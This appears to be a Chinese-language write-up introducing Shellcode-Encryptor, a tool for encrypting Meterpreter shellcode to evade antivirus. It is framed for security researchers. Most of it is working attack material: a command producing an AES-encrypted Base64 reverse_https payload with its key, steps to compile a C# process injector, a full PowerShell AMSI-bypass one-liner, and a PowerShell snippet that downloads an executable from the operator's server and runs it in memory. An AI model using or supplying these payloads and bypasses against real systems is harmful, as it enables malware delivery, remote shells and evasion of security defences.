![](https://image.3001.net/images/20220119/1642598588_61e810bcc90d81f9d8600.jpeg!small)

## 关于Shellcode-Encryptor

Shellcode-Encryptor是一款功能强大的Shellcode加密、解密和执行工具，在该工具的帮助下，广大研究人员可以通过尝试利用Shellcode来绕过反病毒产品，并以此来测试安全产品的安全性能。

从技术实现上来看，Shellcode-Encryptor使用了PowerShell来将源代码注入至内存中，这也是一种最有效的方法，并以此来实现绕过。Shellcode-Encryptor能够生成一个经过Base64编码和AES加密的Shellcode，研究人员可以通过在目标Windows主机上运行这个Shellcode来实现反病毒产品的绕过。

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/plackyhacker/Shellcode-Encryptor.git

## 工具使用

项目下的meterpreter_encryptor.py主要负责创建经过Base64编码和AES加密的Shellcode：

    
    
    root@kali:~# ./meterpreter_encryptor.py -p windows/x64/meterpreter/reverse_https -i 192.168.1.228 -l 443 -f b64
    
    [+] Generating MSFVENOM payload...
    
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    
    [-] No arch selected, selecting arch: x64 from the payload
    
    Found 1 compatible encoders
    
    Attempting to encode payload with 1 iterations of x64/xor_dynamic
    
    x64/xor_dynamic succeeded with size 667 (iteration=0)
    
    x64/xor_dynamic chosen with final size 667
    
    Payload size: 667 bytes
    
    Saved as: ./msf.bin
    
    [+] Encrypting the payload, key=fjlmjiEgnQ4K6CjNCrPlqug1HW4icMec...
    
    [+] Base64 output:
    
    sZkMiiTitR5hQL2YXTBgjq91qq0FuEqgfR7YiKt2N1IZ8vqW3q/BrIYTjBb7nKLXCsJM25sRqh+R9WHGNsTV8webqwx7ZfAYSvlmEmzIJcKaBVdJO+Lbr7h9RomrOdyaPUAZ6P49lnsZFF1fdvnFOg/WvSdKUrx/eKEt5sNBn/Jz43y26mDEwEEqseydPQHyBcT9Av/ZkTQC6GZU8D+pQhKvXNdnlGrHJk4+G25me/Hzr0P1YuX9ZpGbyXb/pLdmdViAGAPtA/OORVt6xmij4AY24j8SLocUs2A6lSJZHYD2C1+DIc1Lyw8UJ6dtNIU2xDtsHCWX0OlkcjU+QoYpCavs78Y+OePjyBwkryWTzMyuKBgAREjbQQdsIn6dQZeqk/tKI/l6Fmhu27V+wFX7mxUP/KXWf9PI/3QYiuLmkJCWFBL9sINPbLVLePFSke8Ik3t+vp5SIcM+wMufg+TXBdUNpE//gTgCpblXdJfkkqVpMFBxnfX2vYPDcFLWteiNsnHCn9REbVB3MqJe5T55tO/CLq1KkZ2R7Z7rra6H8OhJgOLKEdJ/XHdZV9IFatAtRW2dxVo49P2YFmux2WSDiKhVRoCuLMVM6PeTuzsN+2qV4Zrq6tRAVLwmmTn5uflWER1aScePh6+6utXW/0jS+Hz7KiGP2//8+YDwzYbkLJnfn9B4AdmE4BuNTJRrv7tumsxboNkmWOx87lVElzn5ZM9OP721s8LiSyfkD1zm4o9j2u80syPeEU3PXvOU1epBTsTjdwRWlAYF+wzv3olAjPzR/xojjB602MIUNeCPn4fqDp6NjEokELcgawbWNl1vKYo4QEYgtlhVmqIkk2ooz527AEQb5EWQhkaZEWr4AAmGO1YfvYDCTcfUwV9p/jkg

获取到密钥和Shellcode之后，我们就可以将其插入至[
_ProcessInjector.cs_](https://github.com/plackyhacker/ShellcodeEncryptor/blob/master/ProcessInjection.cs)之中了：

    
    
    // 解密Base64 Payload
    
    string payload = "sZkMii [etc...]";
    
    string key = "fjlmjiEgnQ4K6CjNCrPlqug1HW4icMec";

接下来，将C#代码编译成一个可执行文件，比如说metInject.ext，然后将其托管到Web服务器中。

现在，我们就可以将这个可执行文件注入到一个远程PowerShell进程之中了：

    
    
    # AMSI绕过
    
    $a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iutils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*itFailed") {$f = $e}};$f.SetValue($null,$true)
    
     
    
    $bytes = (Invoke-WebRequest "http://192.168.1.228/metInject.exe").Content;
    
    $assembly = [System.Reflection.Assembly]::Load($bytes);
    
    $entryPointMethod = $assembly.GetType('ProcessInjection.Program', [Reflection.BindingFlags] 'Public, NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');
    
    $entryPointMethod.Invoke($null, (, [string[]] ('', '')));

## 工具帮助信息

    
    
    ./meterpreter_encryptor.py -h                                                                     
    
    usage: meterpreter_encryptor.py [-h] [-l LPORT] [-i LHOST] [-p PAYLOAD] [-m METHOD] [-k KEY] [-e ENCODER] [-f FORMAT]
    
     
    
    optional arguments:
    
      -h, --help             显示帮助信息和退出
    
      -l LPORT, --lport LPORT
    
                            msfconsole 监听的本地端口
    
      -i LHOST, --lhost LHOST
    
                            msfconsole 监听的本地主机
    
      -p PAYLOAD, --payload PAYLOAD
    
                            msfvenom生成的Payload
    
      -m METHOD, --method METHOD
    
                            需要使用的方法：thread/delegate.
    
      -k KEY, --key KEY     加密密钥（32个字符长度）
    
      -e ENCODER, --encoder ENCODER
    
                            Meterpreter 编码器
    
      -f FORMAT, --format FORMAT
    
                            输出数据格式

## 反病毒产品扫描结果

下图显示的是antiscan.me的扫描结果：

![](https://image.3001.net/images/20220119/1642598641_61e810f1141fc02e099ad.png!small)

## 工具使用演示

![](https://image.3001.net/images/20220119/1642598665_61e81109572f7405145e3.gif!small)

## 项目地址

 **Shellcode-Encryptor：** 【[
_GitHub传送门_](https://github.com/plackyhacker/Shellcode-Encryptor)】

## 参考资料

> [
> _https://github.com/plackyhacker/ShellcodeEncryptor/blob/master/ProcessInjection.cs_](https://github.com/plackyhacker/ShellcodeEncryptor/blob/master/ProcessInjection.cs)
>
> [
> _https://antiscan.me/scan/new/result?id=gn0muzwLOUOc_](https://antiscan.me/scan/new/result?id=gn0muzwLOUOc)

